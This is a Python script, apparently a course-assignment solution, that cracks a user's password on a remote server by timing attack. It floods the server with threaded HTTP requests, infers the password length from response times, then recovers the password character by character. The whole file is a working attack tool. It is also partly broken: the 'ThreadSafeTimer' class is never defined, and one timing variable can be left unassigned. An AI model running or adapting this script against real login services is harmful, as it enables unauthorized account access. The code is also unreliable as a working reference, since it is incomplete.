import urllib.parse
import time
import string
from concurrent.futures import ThreadPoolExecutor
import pycurl
import io
import threading
from IPython.display import clear_output

_thread_local = threading.local()

### -------------------------- ###
### ---- Global Variables ---- ###
### -------------------------- ###
DIFFICULTY = 20

BASE_URL = "aoi-assignment1.oy.ne.ro"
SERVER_PORT = 8080

CHARSET = string.ascii_lowercase

USERNAME = "326529229" # need to recieve

# since threads wait for a long long time for I/O
# it is possible and wanted to have a lot of threads
NUMBER_OF_THREADS = 20*DIFFICULTY + 300

PASSWORD = ""
LENGTH = -1


### ------------------------- ###
### --- get_curl_instance --- ###
### ------------------------- ###
def get_curl_instance():
    if not hasattr(_thread_local, 'curl'):
        c = pycurl.Curl()
        c.setopt(pycurl.FORBID_REUSE, 0)
        c.setopt(pycurl.TIMEOUT, 4)
        c.setopt(pycurl.CONNECTTIMEOUT, 5)
        _thread_local.curl = c
    return _thread_local.curl

### ------------------------- ###
### ----- try_password ------ ###
### ------------------------- ###
def try_pass(password):
    global USERNAME, DIFFICULTY, BASE_URL, SERVER_PORT

    # Prepare URL
    params = {'user': USERNAME, 'password': password, 'difficulty': DIFFICULTY}
    url = f"http://{BASE_URL}:{SERVER_PORT}/?{urllib.parse.urlencode(params)}"

    # Get or create a per-thread curl handle
    c = get_curl_instance()
    c.setopt(pycurl.URL, url)
    c.setopt(pycurl.HTTPHEADER, ["Connection: keep-alive"])
    # Enable HTTP/2 if supported
    try:
        c.setopt(pycurl.HTTP_VERSION, pycurl.CURL_HTTP_VERSION_2TLS)
    except AttributeError:
        pass

    # Capture Server-Timing header
    server_timing = {'value': None}
    def _header_cb(line: bytes):
        text = line.decode('utf-8', errors='ignore')
        if text.lower().startswith('server-timing:'):
            server_timing['value'] = text.split(':', 1)[1].strip()
    c.setopt(pycurl.HEADERFUNCTION, _header_cb)

    # Capture body into a tiny buffer so we can read "1" or "0"
    buffer = io.BytesIO()
    c.setopt(pycurl.WRITEFUNCTION, buffer.write)

    # Retry on transient errors
    for attempt in range(5):
        try:
            c.perform()
            break
        except pycurl.error as e:
            if attempt == 4:
                raise  # give up after 5 tries

    # Extract timings
    name_lookup = c.getinfo(pycurl.NAMELOOKUP_TIME)
    connect     = c.getinfo(pycurl.CONNECT_TIME)
    prexfer     = c.getinfo(pycurl.PRETRANSFER_TIME)
    startxfer   = c.getinfo(pycurl.STARTTRANSFER_TIME)
    status      = c.getinfo(pycurl.RESPONSE_CODE)

    c.reset()  # ready for next request

    # Compute server-only time in integer nanoseconds
    server_ns = int((startxfer - prexfer) * 1e9)
    # Subtract any global baseline jitter
    baseline = globals().get("NETWORK_BASELINE_NS", 0)
    if(server_ns > baseline):
      corrected_ns = max(0, server_ns - baseline)

    # Determine if the server returned "1"
    body = buffer.getvalue().strip()
    data_correct = (status == 200 and body == b'1')

    return {
        "Status": status,
        "Time": corrected_ns,
        "Data": data_correct,
        "ServerTiming": server_timing['value']
    }


### ----------------------------- ###
### --- crack_password_length --- ###
### ----------------------------- ###
def crack_password_length():
    with ThreadPoolExecutor(max_workers=10) as executor:

      length_timer = ThreadSafeTimer(range(33),0.2)
      futures = []

      for i in range(10):
        for l in range(33):
          futures.append(executor.submit(try_length, l, length_timer))

      # Wait for all threads to complete
      # outside of the loop so that each round wont have to wait on
      # the previous one to finish
      for future in futures:
          future.result()
      return length_timer.get_max_mean_key()

def try_length(l, length_timer):
    # to warm up the connection
    try_pass("!")
    result = try_pass("a" * l)
    length_timer.record_time(l, result.get('Time'))


### ---------------------------- ###
### --- num of repetitions ----- ###
### ---------------------------- ###
def num_repetitions(discovered_length):
    """
    this function returns the number of repetitions needed for each char
    """
    global LENGTH
    # all times 1/internet speed slt
    # remember that discovered_length starts from zero
    return 10*DIFFICULTY*(discovered_length//2+1) + DIFFICULTY*DIFFICULTY*2

### -------------------------- ###
### ---- crack_next_char ----- ###
### -------------------------- ###
def crack_next_char(discovered_length, executor):
    global NUMBER_OF_THREADS, CHARSET
    # to warm up the connection
    try_pass("!")
    r = 1 if LENGTH - discovered_length == 1 else num_repetitions(discovered_length)
    char_timer = ThreadSafeTimer(CHARSET)
    futures = []
    for round in range(r):
      for c in CHARSET:
        futures.append(executor.submit(try_char, c, discovered_length, char_timer))
    # Wait for all threads to complete
    # outside of the loop so that each round wont have to wait on
    # the previous one to finish
    for future in futures:
        future.result()
    return char_timer.get_max_mean_key()



def try_char(chars, discovered_length, char_timer):
    global PASSWORD, LENGTH
    if LENGTH - discovered_length == 1:
        for char in chars:
            result = try_pass(PASSWORD + char + "a" * (LENGTH-discovered_length-1))
            if result.get("Data"):
                char_timer.record_time(char, result.get("Time"))
    else:
        for char in chars:
            result = try_pass(PASSWORD + char + "a" * (LENGTH-discovered_length-1))
            char_timer.record_time(char, result.get("Time"))




### ------------------------- ###
### ---- main --------------- ###
### ------------------------- ###
def main():
    global PASSWORD, LENGTH, NUMBER_OF_THREADS, USERNAME

    # Recieve User's ID
    USERNAME = input("Enter Your ID: ")
    while not try_pass("test").get("Status") == 200:
      print("Invalid ID")
      USERNAME = input("Enter Your ID: ")

    attempt = 1

    clear_output();
    # Start Cracking (;
    with ThreadPoolExecutor(max_workers=NUMBER_OF_THREADS) as executor:
      correct = False
      while not correct:
        #print(f".....Cracking User {USERNAME}'s Password, attempt {attempt}..." , end="\n\n")
        #print("Password - " , end="")
        try:
          # first step - exploit the server's length validation
          LENGTH, time_for_length = crack_password_length()
          # second step - crack the password char by char
          discovered_length = 0
          char_times = []
          while len(PASSWORD) < LENGTH:
              ch, t = crack_next_char(discovered_length, executor)
              PASSWORD += ch
              discovered_length += 1
              char_times.append(t)
              print(ch, end="")
          correct = try_pass(PASSWORD).get('Data')
          if not correct:
            print("\nGENERATED PASSWORD IS INCORRECT, trying again...")
            PASSWORD = ""
            discovered_length=0
            time.sleep(3)
            clear_output()
        except Exception as e:
          print(f"\n[ERROR] - {e}")
          print("trying again...")
          PASSWORD = ""
          discovered_length=0
          time.sleep(3)
        finally:
          attempt += 1


if __name__ == '__main__':
    main()
